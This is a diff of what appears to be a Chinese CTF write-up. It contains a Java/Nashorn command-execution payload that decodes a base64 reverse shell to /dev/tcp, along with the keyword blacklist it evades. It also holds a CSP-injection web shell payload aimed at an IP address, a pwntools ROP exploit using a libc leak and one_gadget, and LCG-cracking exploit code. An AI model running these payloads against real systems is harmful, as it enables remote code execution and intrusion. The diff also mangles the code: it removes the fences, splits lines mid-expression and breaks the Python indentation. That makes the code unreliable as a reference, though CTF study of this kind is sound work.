@@ -55,7 +55,8 @@ else{
 
 Content-Security-Policy-Report-Only=img-src%20none;%20report-uri%20/shell.php;%26bbzl%27s%20shell=system(%27touch%20/tmp/1%27);%26
 
-{"csp-report":{"document-uri":"http://124.221.138.51/template/img.php?Content-Security-Policy-Report-Only=img-src%20none;%20report-uri%20/shell.php;%26bbzl%27s%20shell=system(%27touch%20/tmp/1%27);%26","referrer":"","violated-directive":"img-src","effective-directive":"img-src","original-policy":"img-src none; report-uri /shell.php;&bbzl's shell=system('touch /tmp/1');&","disposition":"report","blocked-uri":"http://124.221.138.51/img/1.jpg","line-number":2,"source-file":"http://124.221.138.51/template/img.php?Content-Security-Policy-Report-Only=img-src%20none;%20report-uri%20/shell.php;%26bbzl%27s%20shell=system(%27touch%20/tmp/1%27);%26","status-code":200,"script-sample":""}}
+{"csp-report":{"document-uri":"http://124.221.138.51/template/img.php?Content-Security-Policy-Report-Only=img-src%20none;%20report-uri%20/shell.php;%26bbzl%27s%20shell=system(%27touch%20/tmp/1%27);%26","referrer":"","violated-directive":"img-src","effective-directive":"img-src","original-policy":"img-src none; report-uri /shell.php;&bbzl's shell=system('touch /tmp/1');&","disposition":"report","blocked-uri":"http://124.221.138.51/img/1.jpg","line-number":2,"source-file":"http://124.221.138.51/template/img.php?Content-Security-Policy-Report-Only=img-src%20none;%20report-uri%20/shell.php;%26bbzl%27s%20shell=system(%27touch%20/tmp/1%27);%26","status-code":
+200,"script-sample":""}}
 
 0x00001251 <+4>:    push   ebp
 0x00001252 <+5>:    mov    ebp,esp
@@ -501,7 +502,8 @@ def main():
             fp= f.read()
             # 识别本地文件
         try:
-            result = client.asr(fp, 'wav', 16000, {'dev_pid': 1537})# 默认1537（普通话 输入法模型），dev_pid参数见本节开头的表格
+            result = client.asr(fp, 'wav', 16000, {'dev_pid': 1537})
+# 默认1537（普通话 输入法模型），dev_pid参数见本节开头的表格
             tmp=result['result'][0][:-1]
             if set(tmp).issubset(set2):
                 dict1[indexname]=int(tmp)
@@ -515,7 +517,8 @@ def main():
                 dict1[indexname]=int(tmp1)
             else:
                 dict1[indexname]=tmp
-        except Exception as e:
+        
+except Exception as e:
             print(e)
             print("./wav/{}.wav".format(i))
     pass
@@ -524,7 +527,8 @@ def main():
     for i in range(0,625):
         try:
             dict2[i]
-        except Exception as e:
+        
+except Exception as e:
             print(e)
             print(i,'不存在')
     pick_file = open('dict2.pickle','wb')
@@ -565,7 +569,8 @@ for i in range(0,625):
         x=(i%25)*100
         y=(i//25)*100
         img1.paste(img,(x,y))
-    except Exception as e:
+    
+except Exception as e:
         print(e)
         print(i,'没有找到')
 img1.save('tmp.png')
@@ -602,7 +607,8 @@ def getpadding(mp3):
     with open(mp3,'rb')as f:
         fr=f.read()
     offset=getFrameoffset(fr[6:10])+10
-    padding=fr[offset-4096:offset]
+    padding=fr[offset-4096:
+offset]
     if set(padding)=={0}:    #全为0说明padding里头没有数据
         print('no mp3 inside')
         return None,fr
@@ -681,11 +687,13 @@ for i in range(48):
         fp= f.read()
         # 识别本地文件
     try:
-        result = client.asr(fp, 'wav', 16000, {'dev_pid': 1737})# 默认1537（普通话 输入法模型），1737是英语
+        result = client.asr(fp, 'wav', 16000, {'dev_pid': 1737})
+# 默认1537（普通话 输入法模型），1737是英语
         tmp=result['result'][0][:-1]
         res.append((i,tmp))
         # print(tmp,end='')
-    except Exception as e:
+    
+except Exception as e:
         print(e)
 open("结果识别.txt",'w').write(''.join([str(i)+'n' for i in res]))
 
@@ -719,7 +727,8 @@ for i in range(0,len(text1),4):
             if set(tmp).issubset(ss):  #字符串是0-9a-fflag{}-的子集的话,即uuid格式
                 print(tmp,end='')
 
-        except Exception as e:
+        
+except Exception as e:
             continue
 # print(tmp)
 
@@ -955,33 +964,13 @@ print(long_to_bytes(s1))
 
 ```
 "process|runtime|javascript|\+|char|\\|from|\[|\]|load"
-```
-
-
-
-```
 java.lang.Runtime.getRuntime().exec("bash -c {echo,ZWNobyxiYXNoIC1pID4mIC9kZXYvdGNwL2lwL3BvcnQgMD4mMQ==}|{base64,-d}|{bash,-i}").getInputStream()
-```
-
-
-
-```
 %6A%61%76%61%2E%6C%61%6E%67%2E%52%75%6E%74%69%6D%65%2E%67%65%74%52%75%6E%74%69%6D%65%28%29%2E%65%78%65%63%28%22%62%61%73%68%20%2D%63%20%7B%65%63%68%6F%2C%5A%57%4E%6F%62%79%78%69%59%58%4E%6F%49%43%31%70%49%44%34%6D%49%43%39%6B%5A%58%59%76%64%47%4E%77%4C%32%6C%77%4C%33%42%76%63%6E%51%67%4D%44%34%6D%4D%51%3D%3D%7D%7C%7B%62%61%73%65%36%34%2C%2D%64%7D%7C%7B%62%61%73%68%2C%2D%69%7D%22%29%2E%67%65%74%49%6E%70%75%74%53%74%72%65%61%6D%28%29
-```
-
-
-
-```
 最终exp:
 {
 "cmd":"import javax.script.ScriptEngineManager;new ScriptEngineManager().getEngineByName("nashorn").eval(java.net.URLDecoder.decode("%6A%61%76%61%2E%6C%61%6E%67%2E%52%75%6E%74%69%6D%65%2E%67%65%74%52%75%6E%74%69%6D%65%28%29%2E%65%78%65%63%28%22%62%61%73%68%20%2D%63%20%7B%65%63%68%6F%2C%5A%57%4E%6F%62%79%78%69%59%58%4E%6F%49%43%31%70%49%44%34%6D%49%43%39%6B%5A%58%59%76%64%47%4E%77%4C%32%6C%77%4C%33%42%76%63%6E%51%67%4D%44%34%6D%4D%51%3D%3D%7D%7C%7B%62%61%73%65%36%34%2C%2D%64%7D%7C%7B%62%61%73%68%2C%2D%69%7D%22%29%2E%67%65%74%49%6E%70%75%74%53%74%72%65%61%6D%28%29"));",
 "x":"guanzhujiarandundunjiechbO"
 }
-```
-
-
-
-```
 <?php
 if($_SERVER['REMOTE_ADDR']!=='127.0.0.1'){
     die('only from local!');
@@ -1000,23 +989,9 @@ else{
         }
     }
 }
-```
-
-
-
-```
 Content-Security-Policy-Report-Only=img-src%20none;%20report-uri%20/shell.php;%26bbzl%27s%20shell=system(%27touch%20/tmp/1%27);%26
-```
-
-
-
-```
-{"csp-report":{"document-uri":"http://124.221.138.51/template/img.php?Content-Security-Policy-Report-Only=img-src%20none;%20report-uri%20/shell.php;%26bbzl%27s%20shell=system(%27touch%20/tmp/1%27);%26","referrer":"","violated-directive":"img-src","effective-directive":"img-src","original-policy":"img-src none; report-uri /shell.php;&bbzl's shell=system('touch /tmp/1');&","disposition":"report","blocked-uri":"http://124.221.138.51/img/1.jpg","line-number":2,"source-file":"http://124.221.138.51/template/img.php?Content-Security-Policy-Report-Only=img-src%20none;%20report-uri%20/shell.php;%26bbzl%27s%20shell=system(%27touch%20/tmp/1%27);%26","status-code":200,"script-sample":""}}
-```
-
-
-
-```
+{"csp-report":{"document-uri":"http://124.221.138.51/template/img.php?Content-Security-Policy-Report-Only=img-src%20none;%20report-uri%20/shell.php;%26bbzl%27s%20shell=system(%27touch%20/tmp/1%27);%26","referrer":"","violated-directive":"img-src","effective-directive":"img-src","original-policy":"img-src none; report-uri /shell.php;&bbzl's shell=system('touch /tmp/1');&","disposition":"report","blocked-uri":"http://124.221.138.51/img/1.jpg","line-number":2,"source-file":"http://124.221.138.51/template/img.php?Content-Security-Policy-Report-Only=img-src%20none;%20report-uri%20/shell.php;%26bbzl%27s%20shell=system(%27touch%20/tmp/1%27);%26","status-code":
+200,"script-sample":""}}
 0x00001251 <+4>:    push   ebp
 0x00001252 <+5>:    mov    ebp,esp
 0x00001254 <+7>:    sub    esp,0x10
@@ -1070,11 +1045,6 @@ Content-Security-Policy-Report-Only=img-src%20none;%20report-uri%20/shell.php;%2
 0x000012ee <+161>:    movzx  eax,al
 0x000012f1 <+164>:    leave  
 0x000012f2 <+165>:    ret
-```
-
-
-
-```
 int verify(const char* input, int size, int map[50][50], int max_val) {
     int x=0, y=0;
     int sum = map[x][y];
@@ -1090,11 +1060,6 @@ int verify(const char* input, int size, int map[50][50], int max_val) 
     }
     return sum == max_val;
 }
-```
-
-
-
-```
 def get_solution(arr):
     dp = [[0 for j in range(50)] for i in range(50)]
     dp[0][0] = arr[0][0]
@@ -1195,25 +1160,10 @@ arr = [
 if __name__ == "__main__":
     sol, max_val, dp = get_solution(arr)
     print(sol)
-```
-
-
-
-```
 RRDDRRDRRDRRRDRDDDDRRRDRDDRRRDRRDRRRDRDRDRDRRRDDRDRRRRDDDDDDDRDDRDDDDDDDDRDDDDDRDDRDRRDRRRRRRDDRRR
-```
-
-
-
-```
 RRDDRRDRRDRRRDRDDDDRRRDRDDRRRDRRDRRRDRDRDRDRRRDDRDRRRRDDDDDDDRDDRDDDDDDDDRDDDDDRDDRDRRDRRRRRRDDRRR
 Good job
 flag{333b61656d554e1e200208247b73}
-```
-
-
-
-```
 import idc
 
 st = MinEA()
@@ -1228,20 +1178,15 @@ while ea < ed:
         patch_byte(ea+3, 0x90)
         patch_byte(ea+4, 0x90)
     ea += 1
-```
+    #include <string.h>
+    #include <stdio.h>
 
+    #define BYTE unsigned char
+    #define WORD unsigned short
+    #define DWORD unsigned int
 
-
-```
-#include <string.h>
-#include <stdio.h>
-
-#define BYTE unsigned char
-#define WORD unsigned short
-#define DWORD unsigned int
-
-#define TRUE 1
-#define FALSE 0
+    #define TRUE 1
+    #define FALSE 0
 
 BYTE bThreshold;  //压缩阈值、长度大于等于2的匹配串才有必要压缩
 
@@ -1358,23 +1303,18 @@ LZSS_decode_out_:
     fclose(pfWrite);
     return 0;
 }
-```
-
-
-
-```
 from pwn import*
 context.log_level=True
-#p=process('./stack')
+    #p=process('./stack')
 p=remote("127.0.0.1",8665)
 elf=ELF('stack')
 libc=ELF('libc.so.6')
 buf=0x6010A0+0X100
 print hex(buf)
-#puts_plt=elf.plt['puts']
+    #puts_plt=elf.plt['puts']
 puts_plt=0x400520
 puts_got=elf.got['puts']
-#read_plt=elf.plt['read']
+    #read_plt=elf.plt['read']
 read_plt=0x400530
 main=0x40071A
 
@@ -1389,12 +1329,12 @@ p.send(payload)
 p.recvuntil('your data:n')
 payload1='a'*0x70+p64(buf)+p64(leve_ret)
 
-#gdb.attach(p,'b *0x40060F')
-#raw_input()
+    #gdb.attach(p,'b *0x40060F')
+    #raw_input()
 
 p.send(payload1)
 
-#p.recv()
+    #p.recv()
 
 putsadd=u64(p.recvuntil('n',drop=True).ljust(0x8,'x00'))
 print hex(putsadd)
@@ -1407,11 +1347,6 @@ p.recv()
 pay= 0x78*'a' + p64(one_gadget)*4
 p.send(pay)
 p.interactive()
-```
-
-
-
-```
 size_r=src.size;
 ptr_r=src.ptr;
 check(src,dst);
@@ -1419,11 +1354,6 @@ free(dst.ptr);
 src.size=0;src.ptr=0;
 dst.size=size_r;dst.ptr=src_r;
 //src=dst时，会导致dst的ptr指向已释放的区域，且dst.size=0
-```
-
-
-
-```
 struct Table {
     struct GCObject *next;
     lu_byte tt;
@@ -1437,11 +1367,6 @@ struct Table {
     struct Table *metatable;
     GCObject *gclist;
 }
-```
-
-
-
-```
 from PIL import Image
 import os
 from aip import AipSpeech
@@ -1501,7 +1426,8 @@ def main():
             fp= f.read()
             # 识别本地文件
         try:
-            result = client.asr(fp, 'wav', 16000, {'dev_pid': 1537})# 默认1537（普通话 输入法模型），dev_pid参数见本节开头的表格
+            result = client.asr(fp, 'wav', 16000, {'dev_pid': 1537})
+# 默认1537（普通话 输入法模型），dev_pid参数见本节开头的表格
             tmp=result['result'][0][:-1]
             if set(tmp).issubset(set2):
                 dict1[indexname]=int(tmp)
@@ -1515,7 +1441,8 @@ def main():
                 dict1[indexname]=int(tmp1)
             else:
                 dict1[indexname]=tmp
-        except Exception as e:
+        
+except Exception as e:
             print(e)
             print("./wav/{}.wav".format(i))
     pass
@@ -1524,7 +1451,8 @@ def main():
     for i in range(0,625):
         try:
             dict2[i]
-        except Exception as e:
+        
+except Exception as e:
             print(e)
             print(i,'不存在')
     pick_file = open('dict2.pickle','wb')
@@ -1565,17 +1493,13 @@ for i in range(0,625):
         x=(i%25)*100
         y=(i//25)*100
         img1.paste(img,(x,y))
-    except Exception as e:
+    
+except Exception as e:
         print(e)
         print(i,'没有找到')
 img1.save('tmp.png')
 img1.show()
 pass
-```
-
-
-
-```
 import pickle
 import os 
 
@@ -1606,7 +1530,8 @@ def getpadding(mp3):
     with open(mp3,'rb')as f:
         fr=f.read()
     offset=getFrameoffset(fr[6:10])+10
-    padding=fr[offset-4096:offset]
+    padding=fr[offset-4096:
+offset]
     if set(padding)=={0}:    #全为0说明padding里头没有数据
         print('no mp3 inside')
         return None,fr
@@ -1638,11 +1563,6 @@ for i,mp3 in enumerate(mp3list):
     else:
         continue
     pass
-```
-
-
-
-```
 import os
 from aip import AipSpeech
 from subprocess import *
@@ -1689,24 +1609,16 @@ for i in range(48):
         fp= f.read()
         # 识别本地文件
     try:
-        result = client.asr(fp, 'wav', 16000, {'dev_pid': 1737})# 默认1537（普通话 输入法模型），1737是英语
+        result = client.asr(fp, 'wav', 16000, {'dev_pid': 1737})
+# 默认1537（普通话 输入法模型），1737是英语
         tmp=result['result'][0][:-1]
         res.append((i,tmp))
         # print(tmp,end='')
-    except Exception as e:
+    
+except Exception as e:
         print(e)
 open("结果识别.txt",'w').write(''.join([str(i)+'n' for i in res]))
-```
-
-
-
-```
 zmvhngzjytatodbimi00ntfilwjjmzutzdfknja0zdq0mmvi
-```
-
-
-
-```
 import string
 from base64 import * 
 
@@ -1735,50 +1647,26 @@ for i in range(0,len(text1),4):
             if set(tmp).issubset(ss):  #字符串是0-9a-fflag{}-的子集的话,即uuid格式
                 print(tmp,end='')
 
-        except Exception as e:
+        
+except Exception as e:
             continue
 # print(tmp)
-```
-
-
-
-```
 已知a,b,N,num1
 num1 = (seed *a + b ) % N
 由于b比N小则
 num1 - b = seed * a % N
 由于取模，则需要模数逆推
 seed = (num1-b)*inverse(a,N)%N
-```
-
-
-
-```
 def solve1(N,a,b,n1):
     return (n1-b)*inverse(a,N) % N
-```
-
-
-
-```
 已知a,N,num1,num2
 需要先通过num1,num2求出b
 由于num2 = (num1 *a + b ) % N
 b = (n2-n1 * a)%N
 然后再带入def solve1()就行
-```
-
-
-
-```
 def solve2(N,a,n1,n2):
     b = (n2-n1 * a)%N
     return solve1(N,a,b,n1)
-```
-
-
-
-```
 这次只知道num1,num2,num3,N
 需要求出a然后带入solve2中求出b
 num3 = (num2*a + b) %N
@@ -1792,19 +1680,9 @@ num3 - num2 = num2*a % N - num1*a %N
 num3 - num2 = a*(num2-num1) % N
 ->
 a = (num3-num2)*inverse(num2-num1,N) %N
-```
-
-
-
-```
 def solve3(N,n1,n2,n3):
     a = (n3-n2)*inverse(n2-n1,N) %N
     return solve2(N,a,n1,n2)
-```
-
-
-
-```
 只知道6个连续的随机数,这次就不能用线性方程组了,因为对与每一个方程,它的模数都是未知的.
 5个方程就会多出5个未知数
 但是如果多个随机数分别乘n,那么gcd就可能等于n
@@ -1826,11 +1704,6 @@ N = GCD(t3*t1-t2**2,t5*t2-t4*t3)
 F = factorint(N)
 F.items() -> p,q
 N = N / pow(p,q)
-```
-
-
-
-```
 def solve4(num1,num2,num3,num4,num5,num6):
     s1 = num2-num1
     s2 = num3-num2
@@ -1847,16 +1720,11 @@ def solve4(num1,num2,num3,num4,num5,num6):
                 if p.bit_length()>128:
                     continue
                 N = N/pow(p,q)
-```
-
-
-
-```
 from pwn import *
 from sympy import factorint
 from Crypto.Util.number import *
 context.log_level = 'debug'
-#io = remote("0.0.0.0",10000)
+    #io = remote("0.0.0.0",10000)
 
 def solve1(N,a,b,num1):
     return (num1-b)*inverse(a,N) % N
@@ -1950,11 +1818,6 @@ for i in range(20):
 challenge4()
 
 io.interactive()
-```
-
-
-
-```
 from Crypto.Util.number import *
 
 p = 101202160159081561029549739902097099275439197324107563340103725793005952286427
